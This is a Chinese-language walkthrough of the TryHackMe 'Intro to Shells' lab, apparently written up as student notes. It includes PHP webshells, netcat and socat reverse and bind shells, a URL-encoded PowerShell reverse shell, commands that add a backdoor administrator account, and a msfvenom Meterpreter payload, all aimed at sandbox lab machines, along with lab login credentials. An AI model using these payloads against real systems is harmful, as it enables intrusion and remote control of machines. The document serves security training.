# What the shell？(Shell简介-下)

本文相关的TryHackMe实验房间链接：https://tryhackme.com/room/introtoshells

## 实践与案例

### 提示

这个章节包含了大量的信息，并且几乎没有机会让你始终将其付诸实践。

接下来的实践与案例将包含两个虚拟机（一个 Ubuntu 18.04 服务器和一个 Windows 服务器），每个都配置有一个简单的网络服务器，请使用它上传和激活 shell。

在这个案例中提供的是一个沙盒环境，所以没有过滤器需要进行绕过，你可以选择登录以使用 netcat、socat 或meterpreter shell 进行练习，提供登录凭据和说明，同时还会给出一些shell示例。

**Linux Practice Box**

目标机器是一个 Ubuntu 服务器，它有一个文件上传页面，运行在一个网络服务器上，这可以用于在 Linux 系统上实践shell上传。socat 和 netcat 都安装在这台机器上，所以请随意通过端口22上的 SSH 尝试登录，直接使用它们进行练习。登录的凭据如下:

> * **Username:** shell
> * **Password:** TryH4ckM3!

**Windows Practice Box**

目标机器是运行 XAMPP 网络服务器的 Windows 2019 Server，可用于在 Windows 上练习shell上传。Socat 和 Netcat 都已安装，可以通过 RDP 或 WinRM 登录进行练习。登录的凭据如下:

> * **Username:** Administrator
> * **Password:** TryH4ckM3!

使用 RDP 登录:

> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE\_IP /u:Administrator /p:'TryH4ckM3!'

### 实践

#### **操作一**

要求：尝试将 webshell 上传到 Linux 机器，然后使用命令: `nc <LOCAL-IP> <PORT> -e /bin/bash` 回连到攻击机上正在等待的监听器。

准备webshell文件：

![image-20221007234143369](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221007234143369.png)

在攻击机上打开Netcat监听器：

![image-20221007234320712](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221007234320712.png)

上传webshell到目标站点，并在目标站点webshell页面的url栏中执行回连netcat监听器的命令：

```shell
nc 10.10.154.186 1234 -e /bin/bash     #这行命令在url栏中执行，前面还有http://10.10.234.65/uploads/webshell.php?cmd=
```

![](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221007234952053.png)

![image-20221007235055917](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221007235055917.png)

成功建立反向shell：

![image-20221007235222844](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221007235222844.png)

#### **操作二**

要求：使用kali中的/usr/share/webshell/php/php-verse-shell.php，更改 IP 和端口，使其与自定义端口匹配。设置一个 netcat 监听器，然后上传并激活 shell。

准备好php-verse-shell.php文件：

![image-20221008000046415](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008000046415.png)

![image-20221008000257557](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008000257557.png)

在攻击机上设置netcat监听器，上传反向shell文件，建立反向shell：

![image-20221008000552594](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008000552594.png)

![image-20221008000707213](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008000707213.png)

#### **操作三**

要求：使用提示给的凭据通过 SSH 登录到目标Linux 机器，使用netcat尝试建立绑定和反向 netcat shell。

使用ssh登录目标机器

* **Username:** shell
* **Password:** TryH4ckM3!

![image-20221008001443655](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008001443655.png)

使用netcat建立绑定shell，使用ssh界面设置监听器（远程为目标机设置监听器），在攻击机上发出shell连接（此处使用创建命令管道的技巧）：

```shell
#在ssh界面输入（远程为目标机设置监听器）：
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
#在攻击机终端输入：
nc 10.10.234.65 4444
#执行成功后，在下图的左侧输入命令操作
```

![image-20221008003001245](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008003001245.png)

使用netcat建立反向shell，在攻击机上设置监听器，使用ssh界面远程操作目标机发出shell连接（此处使用创建命令管道的技巧）：

```shell
#在攻击机终端输入：
nc -nlvp  4444
#在ssh界面输入（远程操作目标机发出shell连接）：
mkfifo /tmp/f; nc 10.10.154.186 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f 
#执行成功后，在下图的左侧输入命令操作
```

![image-20221008003911600](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008003911600.png)

#### **操作四**

要求：针对Windows VM目标机器，尝试向Windows目标机(先访问上传页面)上传并激活php反向shell，这个反向shell文件能正常工作吗？

结果：不能（观察下图中的ERROR信息）

![image-20221008113946227](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008113946227.png)

#### **操作五**

要求：针对Windows 目标的网站站点上传一个 webshell，并尝试使用Powershell 获得一个反向 shell。

准备一个webshell文件(文件内容和前面一样):

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
//或者
<?php 
    if(isset($_GET[‘cmd’])) { 
        system($_GET[‘cmd’]); 
    }
?>
```

![image-20221008114307302](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008114307302.png)

在攻击机上设置监听器，访问目标站点的webshell.php页面并在其url地址栏中添加?cmd= 然后输入以下powershell命令（设置参数为攻击机的ip和端口）：

```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.194.117%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

![image-20221008114911567](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008114911567.png)

![image-20221008115356479](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008115356479.png)

成功建立反向shell：

![image-20221008115444121](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008115444121.png)

#### **操作六**

要求：网络服务器正在使用 SYSTEM特权运行，现在请创建一个新用户并将其添加到“管理员”组，然后通过 RDP 或 WinRM 实现用户登录。

添加新用户及将其添加到管理员组（利用上一个操作中获取的shell）：

```powershell
net user test test123 /add               #添加新用户
net localgroup administrators test /add  #添加用户到管理员组
```

![image-20221008120631937](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008120631937.png)

通过RDP实现新用户的登录（在攻击机上开一个终端执行命令）：

```shell
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.98.5 /u:test /p:'test123'    #添加剪切板功能
```

![image-20221008124829609](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008124829609.png)

![image-20221008124945300](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008124945300.png)

#### **操作七**

要求：尝试使用 socat 和 netcat 在 Windows 目标上获得反向和绑定 shell。

目标机ip：10.10.98.5

攻击机ip：10.10.44.92

**Netcat反向shell**

在攻击者终端:

```shell
nc -lvnp 12345
```

![image-20221008130201266](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008130201266.png)

然后使用 RDP 登录到目标的_管理员账户_，并在 cmd 上输入以下内容:`nc 10.10.44.92 12345 -e"cmd.exe"`

```shell
#使用攻击机终端 通过RDP登录到目标系统的管理员账户
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.98.5 /u:Administrator /p:'TryH4ckM3!'
```

![image-20221008130408806](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008130408806.png)

成功建立netcat反向shell：

![image-20221008132543739](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008132543739.png)

**Netcat绑定shell**

现在正好相反，在cmd上启动一个 netcat 监听器:

```cmd
nc -lvnp 12345 -e "cmd.exe"  # -e和"cmd.exe"之间有空格和没有空格 执行结果一样
```

在攻击者的电脑上运行以下命令:

```shell
nc 10.10.98.5 12345
```

成功建立netcat绑定shell：

![image-20221008133316867](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008133316867.png)

**Socat反向shell**

在攻击者的终端上设置socat监听器（注意：socat监听器在执行监听时没有提示语）:

```shell
socat TCP-L:12345 -
```

然后在目标机器的 cmd 中运行以下命令:

```cmd
socat TCP:10.10.44.92:12345 EXEC:powershell.exe,pipes
```

成功建立socat反向shell：

![image-20221008133804276](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008133804276.png)

**Socat绑定shell**

现在我们在目标机器的 cmd 上启动一个监听器（注意：socat监听器在执行监听时没有提示语）:

```cmd
socat TCP-L:12345 EXEC:powershell.exe,pipes
```

然后在攻击者的电脑上:

```shell
socat TCP:10.10.98.5:12345 -
```

成功建立socat绑定shell：

![image-20221008134251682](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008134251682.png)

#### **操作八**

要求：使用msfvenom生成一个64位 Windows系统的 Meterpreter shell，上传这个shell(可执行文件格式)到 Windows目标机器，然后在Windows目标机器上手动激活已上传的shell文件，并且在攻击机上使用multi/handler模块来捕获Meterpreter shell会话，试验一下这个shell的特性。

目标机ip：10.10.98.5

攻击机ip：10.10.44.92

使用 msfvenom创建payload(包括 shell)的语法如下:

```shell
msfvenom -p <PAYLOAD> <OPTIONS>
```

为了生成 exe 格式的 Windows x64 Meterpreter Shell，我们将在攻击机上使用以下命令:

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.44.92 LPORT=12345
```

![image-20221008135727294](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008135727294.png)

现在我们需要在攻击机上使用来自 Metasploit 的 multi/handler 模块，然后在目标机器内运行 shell.exe 文件。

在攻击机上执行以下操作来设置 multi/handler:

1. 使用 msfconsole 命令打开 Metasploit
2. 输入命令: use multi/handler
3. 通过输入 show options 命令来查看不同的选项
4. 设置PAYLOAD参数 (set payload windows/x64/meterpreter/reverse\_tcp), LHOST参数 (attacker ip) 以及LPORT参数
5. 使用exploit 或者 run 命令执行

![image-20221008140243842](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008140243842.png)

![image-20221008140141272](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008140141272.png)

然后在目标机器上调用shell.exe文件（因为之前使用RDP登录目标机器时开启了剪切板功能，所以直接将shell.exe复制到目标机器上即可）

在攻击机界面获得一个Meterpreter shell：

![image-20221008141416903](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008141416903.png)

#### **操作九**

要求：为任一目标创建分段和不分段的 meterpreter shell，上传exe文件并手动激活它，使用netcat捕获shell——这个shell能正常工作吗？

结果：不能，我们需要使用msf里面的multi/handler模块捕获meterpreter shell，用netcat并不能使这个shell正常工作。

![image-20221008142011637](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008142011637.png)
